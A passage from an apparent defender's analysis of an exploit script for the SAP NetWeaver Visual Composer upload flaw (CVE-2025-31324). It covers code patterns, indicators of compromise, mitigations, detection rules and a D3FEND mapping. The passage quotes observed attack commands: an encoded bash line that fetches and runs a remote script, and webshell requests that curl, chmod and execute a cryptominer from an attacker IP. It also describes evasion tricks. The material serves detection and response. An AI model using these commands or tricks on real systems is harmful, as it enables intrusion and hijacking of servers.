    &lt;p&gt;This snippet would automatically construct the needed headers and boundaries. The presence of the string “multipart/form-data” or “Content-Disposition: form-data” in the script could indicate this logic. If the script was more manually crafted, it might build the HTTP request body as a byte string, concatenating boundary markers and the payload. In either case, the pattern of posting a form with a file field named “file” is the key. In code, you might find references to “name=\”file\”” or similar. The exploit specifically requires that form field name; if it’s wrong, the attack would fail. (The metadata uploader servlet expects a parameter named “file” in the multipart form[11].)&lt;/p&gt;
    &lt;p&gt;Randomization and Evasion Techniques: As mentioned, one pattern for evasion is randomizing the uploaded file name (e.g., generating 8 random letters for each target). If the script does this, it will have a function to generate random strings (possibly using Python’s random.choice on a set of letters). The use of such a function or the presence of hardcoded name lists (some attackers chose names like cache.jsp, helper.jsp, usage.jsp which sound benign) could be patterns in the code. Another evasion seen is prefixing a dot to the filename (e.g., .webhelper.jsp) to make it less visible (dotfiles are hidden on Linux by default)[27]. The script might allow such naming or have it as a default in some cases. Additionally, the script may set the file extension as .jsp intentionally; an interesting nuance is that some attackers used .js extension for JSP content (like coreasp.js)[28] — likely a mistake or trick, but since the server treated it as JSP (perhaps ignoring extension or due to how it was uploaded), it still executed. We might not see that in this script, but it’s worth noting as a variation of the pattern (naming the file with a non-.jsp extension in hopes defenders overlook it, even though it ends up executed as JSP).&lt;/p&gt;
    &lt;p&gt;Use of Deserialization Gadgets: The script’s OAST mode deserialization payload is a strong sign of a more complex exploit technique. It suggests the exploit author was aware that the endpoint might accept certain serialized objects. The pattern here is that a gadget (likely from a library like Commons-Collections or a custom SAP object) is used to cause a callback. In code, this could appear as a Base64 string (for the serialized bytes) or possibly the script might dynamically generate a payload (if a library like ysoserial was integrated). However, since the script is self-contained, it probably carries a pre-generated gadget. For example, a gadget could be one that performs a DNS lookup to [attacker-oast-domain] when deserialized. The pattern of deserialization exploitation in the script is subtle: it might not be obvious without knowing what the data represents. But if the script contains two different payload blobs (one for OAST, one for JSP), that in itself is notable. The OAST payload likely does not drop a file that remains on disk; instead it could be, say, a .dat that the server reads into memory and triggers the gadget (thereby not leaving a direct file artifact aside from the uploaded blob). This is an advanced technique to check vulnerability without a persistent artifact.&lt;/p&gt;
    &lt;p&gt;Encoded Command Execution: After the shell is deployed, attackers often leverage it in ways to avoid detection. While this goes beyond the exploit script’s code, it’s relevant to mention as part of malicious patterns. Security researchers observed that once the JSP shells were live, some attackers sent Base64-encoded commands to them to hide the actual command from process monitors[29]. For instance, instead of invoking curl http://malicious/evil.sh | bash directly (which might be caught by security tools), they sent a command like bash -c “{echo,d2dldCBodHRwOi8vZXZpbC5zaH0=}|{base64,-d}|{bash,-i}” which decodes to the real command at execution time[30]. This technique of splitting and encoding in the command is a pattern attackers use once they have a shell; however, it is not necessarily part of the exploit script itself — it’s part of the follow-on commands delivered through the web shell. We mention it because if the script had any automated post-exploitation steps, it might incorporate such encoding. For example, a script could automatically instruct the webshell to download a second-stage payload in an encoded form (though typically this is done manually or via separate scripts).&lt;/p&gt;
    &lt;p&gt;Persistence Mechanisms: Another pattern is whether the script tries to establish persistence beyond the JSP. The question scope is the script’s function, so likely not — the JSP shell itself is a persistence mechanism. But some payloads observed (like coreasp.jsp described by EclecticIQ) go further by loading classes in memory and using sophisticated tricks (AES-encrypted communications, memory-only backdoors, etc.)[31]. The initial exploit script would just upload those files if the attacker chooses to use them. For example, the threat actor might have had multiple JSP files: one simple (like forwardsap.jsp, which just runs commands)[32] and one advanced (coreasp with encrypted channel)[31], both uploaded via the same script. The script itself might not distinguish content — it just sends whatever file it’s given. However, recognizing the pattern of an AES-encrypted webshell (e.g., finding a hardcoded 128-bit key in the JSP code) is important for responders. Such a key (like 693e1b581ad84b87 seen in coreasp[33]) is an indicator of a known webshell family (Behinder). The exploit script presumably doesn’t generate that, but we mention it as part of code patterns in the payload.&lt;/p&gt;
    &lt;p&gt;In summary, the exploit script’s code shows patterns of file upload abuse (multipart form injection), command injection via webshell code, and deliberate obfuscation (encoding, randomization) to evade detection. These patterns align with typical tactics for exploiting and maintaining access on enterprise applications.&lt;/p&gt;
    &lt;head rend="h2"&gt;Indicators of Compromise (IoCs)&lt;/head&gt;
    &lt;p&gt;Several unique artifacts and indicators can suggest that this exploit script was used against a system. These IoCs come from both the network activity of the script and the payloads left on the compromised SAP server:&lt;/p&gt;
    &lt;p&gt;Unusual HTTP POST Traffic to /developmentserver/metadatauploader: Any web server logs or network monitoring that show HTTP requests to the path /developmentserver/metadatauploader are highly suspicious, especially if they come from external sources. In a normal SAP deployment, this endpoint would rarely (if ever) be accessed by anonymous external clients. In confirmed attacks, multiple security firms saw surges of POST requests to this path in late March and April 2025[34][35]. Specifically, look for requests with no authentication cookies or SSO tickets present[36] (meaning the session is not a logged-in SAP user). SAP’s own advisory noted that any POST to this endpoint without a valid SAP session is an anomaly[36]. Additionally, the User-Agent string can be a giveaway: the default python-requests/* user agent was observed in exploit attempts[17]. If an attacker customized their script, the UA might differ, but generic tool UAs or missing Accept headers can stand out. Indicator: log entries like:&lt;/p&gt;
    &lt;code&gt;&lt;lb/&gt; …[IP] — — “POST /developmentserver/metadatauploader HTTP/1.1” 200 — “-” “python-requests/2.XX”…&lt;/code&gt;
    &lt;p&gt;Multipart Form in Request Body: Related to the above, if you have deeper packet logs, the presence of a multipart form with filename=”*.jsp” in the body is a clear indicator. Legitimate uses of the metadatauploader (if any) might involve different file types (perhaps XML or model files, not JSP). So a JSP upload attempt is inherently malicious. ProjectDiscovery released detection rules (Nuclei templates) that specifically check for the ability to upload and even identify a known JSP webshell file on the server[37]. These can be used to test if an instance was compromised by looking for known patterns in HTTP responses or accessible JSPs.&lt;/p&gt;
    &lt;p&gt;Unexpected JSP or Java files on the server: The clearest IoC on the host is the presence of unfamiliar files in the Visual Composer directories. Administrators should check the file system paths used by Visual Composer. Common directories (for SAP Portal installations) include:&lt;lb/&gt; …/irj/servlet_jsp/irj/root/ (the root of the Portal application’s JSP pages)[6],&lt;lb/&gt; …/irj/servlet_jsp/irj/work/ and …/irj/servlet_jsp/irj/work/sync/ (working directories where JSPs are compiled or cached)[24].&lt;lb/&gt; Any .jsp, .java, or .class files in these directories that were not installed by SAP updates could be malicious[38]. In particular, look for:&lt;/p&gt;
    &lt;p&gt;Filenames like helper.jsp, cache.jsp, usage.jsp, forwardsap.jsp, coresap.jsp, or variants of these[39]. These names have appeared in multiple reports of this exploit. “Helper” and “cache” were likely chosen to blend in (cache.jsp could be mistaken for a legitimate cache page). “Usage.jsp” might be a renamed copy of helper.jsp in some cases[40].&lt;/p&gt;
    &lt;p&gt;Filenames with random 6–10 character combinations (e.g., tgmzqnty.jsp, ylgxcsem.jsp)[20]. Attackers using automated scripts at scale often generate a new name per target. If you find oddly named JSPs that you don’t recognize, treat them as suspect.&lt;/p&gt;
    &lt;p&gt;Hidden or disguised names: e.g., a leading dot (.webhelper.jsp)[41] which might not be immediately visible in directory listings, or a name like 404_error.jsp which is meant to look benign[21].&lt;/p&gt;
    &lt;p&gt;Visual Composer’s legitimate files might have technical names or be packaged in WARs — any loose JSP file sitting in these folders, especially one with recent timestamps, is a red flag.&lt;/p&gt;
    &lt;p&gt;In incident response cases, SHA-256 hashes of known malicious files have been recorded. For example, one helper.jsp sample had hash&lt;/p&gt;
    &lt;code&gt; 1f72bd2643995fab4ecf7150b6367fa1b3fab17afd2abed30a98f075e4913087&lt;/code&gt;
    &lt;p&gt;[42] and a cache.jsp sample hash&lt;/p&gt;
    &lt;code&gt; 794cb0a92f51e1387a6b316b8b5ff83d33a51ecf9bf7cc8e88a619ecb64f1dcf&lt;/code&gt;
    &lt;p&gt;[43]. If you cannot readily hash files on the server, even just searching for the presence of the string Runtime.getRuntime().exec inside .jsp files can quickly pick up these webshells, since that API call is rarely used in SAP’s normal JSPs.&lt;/p&gt;
    &lt;p&gt;Signs of Execution of the Web Shell: Once the JSP is on the server, attackers will start using it. This can leave traces in various logs:&lt;/p&gt;
    &lt;p&gt;· The SAP NetWeaver access log may show GET/POST requests to unusual JSPs under the /irj/ path. E.g., requests to /irj/helper.jsp or /irj/&amp;lt;random&amp;gt;.jsp. Particularly, query parameters like ?cmd= or other odd parameter names (some shells use param like cmdhghgghhdd as seen in forwardsap.jsp[44]) in those requests are indicators. Onapsis observed attackers issuing requests like&lt;/p&gt;
    &lt;code&gt;GET /irj/helper.jsp?cmd=curl%20-o%20/tmp/8bq.sh%20http://23.95.123[.]5:666/xmrigCCall/8bq.sh&lt;/code&gt;
    &lt;p&gt;to download a script, followed by&lt;/p&gt;
    &lt;code&gt;GET /irj/helper.jsp?cmd=chmod%20777%20/tmp/8bq.sh and GET /irj/helper.jsp?cmd=/tmp/8bq.sh&lt;/code&gt;
    &lt;p&gt;to run a cryptominer installer, and even a cleanup GET /irj/helper.jsp?cmd=rm%20/f%20/tmp/8bq.sh[14]. Each of these entries shows the usage of the webshell to execute OS commands. If such patterns (especially multiple cmd= with typical Linux commands) appear in logs, it’s a clear indicator the system was compromised via this vulnerability.&lt;/p&gt;
    &lt;p&gt;OS process logs or monitoring might show the SAP Java process spawning shell subprocesses (like cmd.exe on Windows or /bin/sh on Linux). A webshell execution will run as the SAP service account. For instance, if you see processes owned by &amp;lt;sid&amp;gt;adm (on Unix) running unexpected commands (netstat, ifconfig, whoami, curl, wget, etc.), that’s a sign those commands were invoked via a webshell[45]. Red Canary suggests detecting bash processes that use the -c {echo,…}|{base64,-d}|{bash,-i} pattern[46][47], or generally any base64 decoding usage in a shell, as that often signals an attacker trying to hide their command.&lt;/p&gt;
    &lt;p&gt;If command logging is enabled, you might capture the exact commands attackers run. Common post-exploit recon commands have included: viewing host files (cat /etc/hosts, /etc/passwd), network info (ifconfig, netstat -an), process and user info (ps -ef, whoami, id), and environment checks (uname -a, hostname)[45]. These by themselves aren’t proof of how they were run, but if seen in conjunction with the IoCs above, they likely came from the webshell.&lt;/p&gt;
    &lt;p&gt;External Communication from the SAP Server: The presence of a webshell often leads to outbound traffic from the server (for downloading second-stage tools or establishing backdoors). If you monitor egress traffic, IoCs include:&lt;/p&gt;
    &lt;p&gt;Connections to cloud storage or known malicious hosts as seen in Red Canary’s report: e.g., AWS S3 buckets brandnav-cms-storage[.]s3.amazonaws.com and abode-dashboard-media[.]s3.ap-south-1.amazonaws.com (used to host malware)[48], a Cloudflare Tunnel domain overseas-recognized-athens-oakland.trycloudflare.com (used to fetch a malicious script via v2.js)[49], an Alibaba Cloud OSS domain ocr-freespace.oss-cn-beijing.aliyuncs.com (hosting a config.sh)[50], and other IPs like 23.95.123[.]5:666 (hosting a cryptominer script)[51]. These were all associated with post-exploitation activity of CVE-2025–31324. Any unusual outbound HTTP/HTTPS from an SAP server could indicate the webshell was used to download tools.&lt;/p&gt;
    &lt;p&gt;DNS queries for weird hostnames (if using OAST, the initial deserialization payload might cause the server to do a DNS lookup to a domain like &amp;lt;random&amp;gt;.&amp;lt;attacker-oast&amp;gt;.burpcollaborator.net). If you have egress DNS logs, a lookup to an unfamiliar domain at the time of the metadatauploader request could confirm the OAST test was triggered.&lt;/p&gt;
    &lt;p&gt;Artifacts on Disk: Aside from JSP files, check for any .war or .jar files with suspicious names or timestamps around the attack time. The vulnerability allows WAR deployment (which could persist even after a reboot if not removed). Attackers might also drop tools like scanners or payload droppers on disk via the shell (for example, one might find a compiled reverse shell binary or a script like 8bq.sh in /tmp, as seen above). These are secondary IoCs but important if the attackers moved further.&lt;/p&gt;
    &lt;p&gt;Network: POST to /metadatauploader (especially unauthenticated)[36]; GET/POST to odd JSPs under /irj/[6]; attacker’s infrastructure domains in outbound traffic[52][53].&lt;/p&gt;
    &lt;p&gt;Files: Unexpected JSP/WAR in SAP web directories (e.g., helper.jsp, random-named JSPs)[20][39]; any content in those JSPs containing exec calls.&lt;/p&gt;
    &lt;p&gt;Processes: SAP Java process launching system commands; base64 or crypto miner processes; abnormal network utility usage by SAP process.&lt;/p&gt;
    &lt;p&gt;Credentials: Though not directly asked, note that if SAP user accounts suddenly show in logs doing actions they normally wouldn’t, it could indicate the attacker pivoted further — but the initial exploit is unauthenticated, which is key.&lt;/p&gt;
    &lt;head rend="h2"&gt;Mitigation and Detection Strategies&lt;/head&gt;
    &lt;p&gt;Preventing and detecting the use of this exploit script involves both applying patches and implementing compensating controls and monitoring. Here are the key mitigation steps:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Apply the SAP Patch (Security Note 3594142) — SAP released an out-of-band patch on April 24, 2025, addressing this vulnerability[54]. Installing the patched version of the Visual Composer (VCFRAMEWORK 7.50) or the provided security fix will close the unauthorized upload hole. This is the most direct way to prevent exploitation. All SAP NetWeaver versions 7.x with Visual Composer are affected and should be updated immediately, outside of normal patch cycles[55]. (Be aware that patching will not remove any webshells or malware already dropped on the system; those must be found and removed separately.)&lt;/item&gt;
      &lt;item&gt;Isolate or Disable the Vulnerable Component — If you cannot patch promptly, consider disabling the Visual Composer “Development Server” or at least blocking access to the metadata uploader endpoint:&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;3. Network-Level Blocking: Use a WAF, reverse proxy, or firewall to block external access to /developmentserver/ paths entirely[56]. In most cases, this developer-oriented function does not need to be exposed to the internet. At minimum, restrict it to trusted internal networks or specific IPs. Many attacks occurred on internet-facing SAP systems; cutting off that access greatly reduces risk.&lt;/p&gt;
    &lt;p&gt;4. Remove/Disable Visual Composer: If Visual Composer is not actively used, uninstall or deactivate it[56]. SAP’s guidance suggests checking if the component is installed via system info; if not needed, taking it out eliminates the vulnerable endpoint[57]. In some cases, simply undeploying the Visual Composer application from the SAP NetWeaver server may be possible as a temporary mitigation (SAP support can advise on this).&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Authentication as Mitigation: If neither patching nor removal is possible, another approach could be to enforce authentication at the web server level for the /developmentserver/metadatauploader URL. For example, require an SAP login or an IP allowlist for that endpoint (though this might be non-trivial without the patch, it could be done via a web dispatcher or proxy rule).&lt;/item&gt;
      &lt;item&gt;Web Application Hardening: Implement strict checks on any upload functionality in your environment. While this particular endpoint is hard-coded and normally not user-facing, as a general measure ensure that all file upload endpoints validate file types and enforce authentication/authorization[58]. For instance, Visual Composer’s endpoint should ideally only accept certain file types (if it’s meant for model files) and only from authorized users. In absence of a vendor fix, a custom rule on the proxy to drop requests with filename=.*\.jsp or other executable extensions could help, though it’s a whack-a-mole approach. The patch is the real fix.&lt;/item&gt;
      &lt;item&gt;Detect and Respond to Past Exploitation: Given that this was exploited as a zero-day, it’s critical to hunt for signs that someone might have used this script before patching. Steps include:&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;8. File System Scan: Immediately search the known directories (irj/root, irj/work, etc.) for any unexpected files[59]. Remove any malicious JSPs or other droppers found, but be careful to preserve copies for analysis. Also inspect subdirectories (attackers might bury shells in subfolders if writable).&lt;/p&gt;
    &lt;p&gt;9. Log Review: Go through HTTP access logs for any requests to /metadatauploader (successful or not)[36]. Also review logs for access to unusual JSPs as detailed in IoCs. This can help identify the timeframe of compromise and the commands run (if query strings are logged). Look back several months (reports indicate exploitation in the wild at least since late March 2025[60], and even suspicious scans in January 2025[61]).&lt;/p&gt;
    &lt;p&gt;10. Outgoing Connections: Check firewall logs or proxy logs from the SAP server network for connections to known C2 or download sites around those times[62]. If found, that confirms secondary payloads were executed — you’ll need to eradicate those (malware, miners, etc.) as well.&lt;/p&gt;
    &lt;p&gt;11. System Processes and Tasks: On the SAP host, inspect processes and scheduled tasks. Attackers might have created scheduled jobs or services (for persistence) using the access from the shell. Look for any new cron jobs, Windows scheduled tasks, or unusual services installed around the compromise date.&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Use IoC Scanners: Tools have been released to automate some of this hunting. For example, Onapsis (with Mandiant) published an open-source scanner that can detect vulnerable systems and known IoC artifacts of this exploit[63]. ProjectDiscovery’s Nuclei templates (two of them) can check for the vulnerability and the presence of the common JSP webshell on a server[37]. These can be leveraged to quickly assess large environments for compromise signs.&lt;/item&gt;
      &lt;item&gt;Ongoing Monitoring and Endpoint Security: Strengthen monitoring on SAP systems since they are now confirmed targets:&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;14. EDR/XDR on SAP hosts: Ensure that endpoint detection is deployed on the SAP application servers (while keeping in mind performance). Create alerts for the SAP Java process spawning command interpreters or network tools[64]. For instance, a rule like “if process = jlaunch.exe (SAP Java) spawns cmd.exe or powershell.exe, alert” or the Linux equivalent for /usr/sap/…/j2ee process spawning /bin/sh or /usr/bin/curl. The behaviors observed (reading /etc/passwd, using wget/curl, executing coin miners) should all be anomalous for an SAP process — good EDR rules can catch these.&lt;/p&gt;
    &lt;p&gt;15. Network Segmentation: Treat the SAP environment as high-security. Visual Composer systems should not be directly reachable from the internet if possible[65]. Place them behind VPNs or at least restrict source IP ranges. Also, the SAP server should have limited outbound internet access — if it doesn’t need to reach arbitrary hosts, then any such traffic could be blocked or at least alerted on. This could prevent attackers from easily pulling in tools or exfiltrating data.&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Web Application Firewall (WAF) rules: Deploy WAF rules that specifically watch for multipart/form-data requests with file uploads to unusual endpoints like this. Even generic rules that flag uploads of files with extensions .jsp, .war to any URL could catch this (since in normal business usage, uploading JSPs to a server at runtime is not standard). Given the emergency nature of this vuln, some security vendors provided virtual patch rules — check if your WAF vendor released a signature for CVE-2025–31324.&lt;/item&gt;
      &lt;item&gt;User Awareness and Service Monitoring: Ensure your SAP administrators are aware of this threat. They should be on the lookout for any issues (e.g., a slower system due to a miner running, unexplained system accounts, etc.). Also, monitor the SAP application logs for any unusual errors that could indicate someone poking at internals.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;By combining prompt patching with vigilant monitoring, you can both prevent the exploit and detect any successful use of the script. Organizations should also keep an eye on threat intelligence; this exploit was used by both cybercriminals (for crypto-mining, initial access brokerage) and nation-state actors[66][67], meaning the threat is widespread. New variants of the exploit script may arise, but they will follow the same fundamental patterns outlined above.&lt;/p&gt;
    &lt;p&gt;In conclusion, the script under analysis is a dangerous but now well-understood weapon. It takes advantage of a SAP zero-day to upload code (often a JSP webshell) to the server, using obfuscation to hide its intent and providing attackers with a foothold in high-value systems. Understanding each function of this script — from payload encoding to HTTP execution — and knowing the traces it leaves, enables defenders to mitigate the risk and respond effectively.&lt;/p&gt;
    &lt;p&gt;Following MITRE ATT&amp;amp;CK TTPs for the script have been found:&lt;/p&gt;
    &lt;head rend="h2"&gt;Detection Rules for SAP NetWeaver CVE-2025–31324 Exploitation&lt;/head&gt;
    &lt;p&gt;SAP NetWeaver Visual Composer Exploitation Attempt — Splunk Security Content. This Splunk rule monitors HTTP HEAD and POST requests to the vulnerable SAP NetWeaver Visual Composer endpoint /developmentserver/metadatauploader and flags those returning HTTP 200 OK, which can indicate reconnaissance or an active exploit attempt of CVE-2025–31324[1]. Exploiting this flaw allows unauthenticated attackers to upload arbitrary files (e.g. JSP web shells) and achieve remote code execution, threatening full system compromise[2]. Tags: MITRE T1190 (Exploit Public-Facing Application)[3]. Rulehound Link: SAP NetWeaver Exploitation Attempt&lt;/p&gt;
    &lt;p&gt;Potential Java WebShell Upload in SAP NetWeaver Server — Sigma (platform-agnostic rule). This Sigma rule detects suspicious file upload behavior consistent with CVE-2025–31324 exploitation[4]. It looks for HTTP POST requests with content type application/octet-stream targeting SAP NetWeaver paths (e.g. containing /irj/ and ending in .jsp, .java or .class files) — a pattern indicative of a malicious JSP or Java web shell being uploaded[5][6]. Such activity is abnormal and often precedes an attacker executing the web shell on the server. Tags: T1505.003 (Web Shell on server)[7]. Rulehound Link: Java WebShell Upload Detection.&lt;/p&gt;
    &lt;head rend="h2"&gt;Detection Rules for JSP Webshell Activity&lt;/head&gt;
    &lt;p&gt;Potential SAP NetWeaver Webshell Command Execution — Sigma rule. Focused on spotting webshell usage on SAP NetWeaver, this rule watches web server logs for HTTP requests to JSP files in the /irj/servlet_jsp/irj/ directory that contain malicious command parameters[8][9]. It flags common webshell patterns such as query strings starting with cmd=, exec= or command= and containing typical OS command keywords (whoami, uname, ifconfig, etc.) or even echoed Base64 content (e.g. usage of echo with base64 in the query)[10][11]. These indicators suggest an attacker executing system commands via a JSP shell placed on the server. Tags: T1190 (Initial Access via exploit) and T1505.003 (Webshell on server)[12]. Rulehound Link: SAP NetWeaver Webshell Command Exec (Sigma).&lt;/p&gt;
    &lt;p&gt;Detect Webshell Exploit Behavior — Splunk Security Content. This rule identifies when a web server process spawns an interactive command process, a strong sign of webshell activity. It specifically looks for processes like cmd.exe, powershell.exe or bash being launched by common web server executables (e.g. IIS’s w3wp.exe or Nginx)[13]. Such behavior indicates an attacker may have installed a webshell and is using it to execute commands on the server (for example, an IIS process starting a Windows command shell). Tags: T1505.003 (Webshell)[14]. Rulehound Link: Webshell Exploit Behavior (Splunk).&lt;/p&gt;
    &lt;p&gt;Suspicious Process By Web Server Process — Sigma rule. This cross-platform detection rule catches parent-child process anomalies associated with webshells or post-exploitation. It monitors for any web server process (including IIS (w3wp.exe), Apache (httpd.exe), or Tomcat’s Java process) spawning unusual child processes like command shells or admin tools[15][16]. For instance, the rule will trigger if a Tomcat Java process (java.exe) launches cmd.exe or /bin/sh on the host. The presence of these child processes (e.g. certutil.exe, bash.exe, cmd.exe, netsh.exe, etc.) under a web server parent is highly indicative of a webshell executing system commands[17][18]. Tags: T1190 and T1505.003 (exploitation leading to web shell activity)[19]. Rulehound Link: Suspicious Process Spawned by Web Server.&lt;/p&gt;
    &lt;p&gt;[4] [5] [6] [7] Potential Java WebShell Upload in SAP NetViewer Server | Detection.FYI&lt;/p&gt;
    &lt;p&gt;[8] [9] [10] [11] [12] Potential SAP NetViewer Webshell Command Execution | Detection.FYI&lt;/p&gt;
    &lt;p&gt;[15] [16] [17] [18] [19] Suspicious Process By Web Server Process | Detection.FYI&lt;/p&gt;
    &lt;p&gt;SOC Prime automatically generated threat hunting opportunity KQL Microsoft Defender (not yet tested):&lt;/p&gt;
    &lt;code&gt;DeviceNetworkEvents &lt;lb/&gt;| where ActionType == “ConnectionRequest” and RemoteUrl contains “developmentserver/metadatauploader” &lt;lb/&gt;| union (&lt;lb/&gt; DeviceFileEvents &lt;lb/&gt; | where InitiatingProcessFileName == “java.exe” and FileName endswith “.jsp” and FolderPath contains “/irj/”&lt;lb/&gt;)&lt;lb/&gt;| union (&lt;lb/&gt; DeviceProcessEvents &lt;lb/&gt; | where InitiatingProcessFileName == “java.exe” and FileName in (“cmd.exe”, “sh”) &lt;lb/&gt; | extend UserAgent = extractxml(@”&amp;lt;data&amp;gt;(.*)&amp;lt;/data&amp;gt;”, tostring(EventData))&lt;lb/&gt;)&lt;lb/&gt;| union (&lt;lb/&gt; DeviceNetworkEvents &lt;lb/&gt; | where ActionType == “ConnectionRequest” and RemoteUrl contains “/irj/servlet_jsp/irj/root/” and UserAgent in (“Python”, “curl”)&lt;lb/&gt;)&lt;lb/&gt;| extend Base64EncodedPayload = extractxml(@”&amp;lt;data&amp;gt;(.*)&amp;lt;/data&amp;gt;”, tostring(EventData))&lt;lb/&gt;| where Base64EncodedPayload !contains “null” &lt;lb/&gt;| project-reorder Timestamp, DeviceId, DeviceName, InitiatingProcessFileName, FileName, FolderPath, RemoteUrl, UserAgent, Base64EncodedPayload &lt;lb/&gt;| where Timestamp &amp;gt; ago(7d) &lt;lb/&gt;| summarize count() by bin(Timestamp, 1h), DeviceId, DeviceName, InitiatingProcessFileName, FileName, FolderPath, RemoteUrl, UserAgent, Base64EncodedPayload &lt;lb/&gt;| render timechart&lt;/code&gt;
    &lt;head rend="h2"&gt;SAP exploit case into CAD&lt;/head&gt;
    &lt;p&gt;INSA’s D3FEND CAD workspace:&lt;/p&gt;
    &lt;p&gt;Attack chain with nodes:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Exploit &lt;code&gt;/metadatauploader&lt;/code&gt;endpoint (T1190)&lt;/item&gt;
      &lt;item&gt;Upload JSP shell (T1505.003)&lt;/item&gt;
      &lt;item&gt;Execute commands (T1059.003/.004)&lt;/item&gt;
      &lt;item&gt;Maintain persistence (T1505.003 again)&lt;/item&gt;
      &lt;item&gt;Communicate via HTTP (T1071.001)&lt;/item&gt;
      &lt;item&gt;Use obfuscation (T1027/T1140)&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;D3FEND CAD defensive techniques:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;D3-WAF: HTTP Request Filtering (mitigates T1190)&lt;/item&gt;
      &lt;item&gt;D3-PM: Patch Management (mitigates T1190)&lt;/item&gt;
      &lt;item&gt;D3-NS: Network Segmentation (delays T1190)&lt;/item&gt;
      &lt;item&gt;D3-FIM: File Integrity Monitoring (detects T1505.003)&lt;/item&gt;
      &lt;item&gt;D3-PSA: Process Spawn Analysis (detects T1059)&lt;/item&gt;
      &lt;item&gt;D3-HAD: HTTP Anomaly Detection (detects T1071.001)&lt;/item&gt;
      &lt;item&gt;D3-CI: Content Inspection (detects T1027/T1140)&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Nodes: ATT&amp;amp;CK techniques (T1190, T1505.003, T1059.003/.004, T1071.001, T1027/T1140) and D3FEND patterns (PatchManagement, HTTPRequestFiltering, NetworkSegmentation, FileIntegrityMonitoring, ProcessSpawnAnalysis, ContentInspection, ProtocolAnomalyDetection).&lt;/p&gt;
    &lt;p&gt;Edges: causal attack flow (&lt;code&gt;enables&lt;/code&gt;, &lt;code&gt;uses&lt;/code&gt;) and defense relations (&lt;code&gt;prevents&lt;/code&gt;, &lt;code&gt;mitigates&lt;/code&gt;, &lt;code&gt;detects&lt;/code&gt;, &lt;code&gt;restricts&lt;/code&gt;) with confidence hints.&lt;/p&gt;
    &lt;head rend="h2"&gt;Practical workflow for the SAP exploit model&lt;/head&gt;
    &lt;p&gt;Step 1: Encode your attack chain in ATT&amp;amp;CK notation inside CAD.&lt;/p&gt;
    &lt;p&gt;Step 2: Drag corresponding D3FEND techniques and connect them with &lt;code&gt;mitigates/detects&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;Step 3: Save/export as CAD JSON. This can be imported back into CTID’s Attack Flow Builder or integrated with SIEM/SOAR for automated playbook validation.&lt;/p&gt;
    &lt;p&gt;Step 4: Use CAD’s scoring: measure how many steps of the SAP exploit are blocked by existing defenses.&lt;/p&gt;
    &lt;head rend="h2"&gt;Sources&lt;/head&gt;
    &lt;p&gt;The analysis above is supported by threat intelligence reports and technical details from security researchers[1][11][12][20][56][36], which detail the exploit mechanism, observed payloads, and recommended defenses for CVE-2025–31324.&lt;/p&gt;
    &lt;p&gt;[1] [5] [7] [19] [22] [25] [36] [54] [56] [58] [59] [62] [64] [65] Exploited! SAP NetWeaver Visual Composer Unauthenticated File-Upload Vulnerability (CVE-2025–31324) — IONIX&lt;/p&gt;
    &lt;p&gt;[2] [3] [4] [24] [35] [37] [60] [63] [66] New Critical SAP NetWeaver Flaw Exploited to Drop Web Shell, Brute Ratel Framework&lt;/p&gt;
    &lt;p&gt;[6] [20] [38] [55] [57] Active Exploitation of SAP NetWeaver Visual Composer CVE-2025–31324 | Rapid7 Blog&lt;/p&gt;
    &lt;p&gt;[8] [9] [10] GitHub — nullcult/CVE-2025–31324-File-Upload: A totally unauthenticated file-upload endpoint in Visual Composer lets anyone drop arbitrary files (e.g., a JSP web-shell) onto the server.&lt;/p&gt;
    &lt;p&gt;[11] [12] [13] [16] [17] [18] [23] CVE-2025–31324: SAP NetWeaver Remote Code Execution Vulnerability Explained&lt;/p&gt;
    &lt;p&gt;[14] [21] [27] [39] [40] [41] [42] [43] CVE-2025–31324 SAP Zero-Day Vulnerability | Full Threat Brief&lt;/p&gt;
    &lt;p&gt;[15] [26] [34] [45] [61] Threat Brief: CVE-2025–31324 (Updated June 25)&lt;/p&gt;
    &lt;p&gt;[28] [31] [32] [33] [44] [67] China-Nexus Nation State Actors Exploit SAP NetWeaver (CVE-2025–31324) to Target Critical Infrastructures&lt;/p&gt;
    &lt;p&gt;[29] [30] [46] [47] [48] [49] [50] [51] [52] [53] CVE-2025–31324 in SAP NetWeaver enables malicious file uploads&lt;/p&gt;
    &lt;p&gt;https://redcanary.com/blog/threat-intelligence/cve-2025-31324/&lt;/p&gt;
    &lt;p&gt;The blog contains further pseudo code for detection and examples for another way to exploit the vulnerability. IOCs for domains and URL are quite the same, so this would be in combination a good detection opportunity.&lt;/p&gt;
    &lt;head rend="h2"&gt;NLP/linguistic markers inside the script (useful for YARA/ML signatures)&lt;/head&gt;
    &lt;p&gt;These are direct strings and stylometry cues present in the code you pasted. They are not proof of attribution by themselves, but they are excellent for detection, clustering, and correlation:&lt;/p&gt;
    &lt;p&gt;Branding / taunts embedded as prints and banners&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Repeated banner line (many times):&lt;code&gt;MADE BY SCATTERED LAPSUS$ HUNTERS ---- SHINYHUNTERS ----&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;Profane taunt repeatedly printed:&lt;code&gt;fuck da CCP man dey stole our 0day frfr&lt;/code&gt;&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Sociolect / slang / style&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Use of Gen-Z slang and eye-dialect: “da”, “dey”, “frfr” (“for real, for real”), “0day”.&lt;lb/&gt;→ Stylistic fingerprint for clustering similar tooling and lures; can drive NLP features (n-grams, slang dictionaries).&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Anti-detection string-mangling hints (useful in code-similarity)&lt;/p&gt;
    &lt;list rend="ul"&gt;
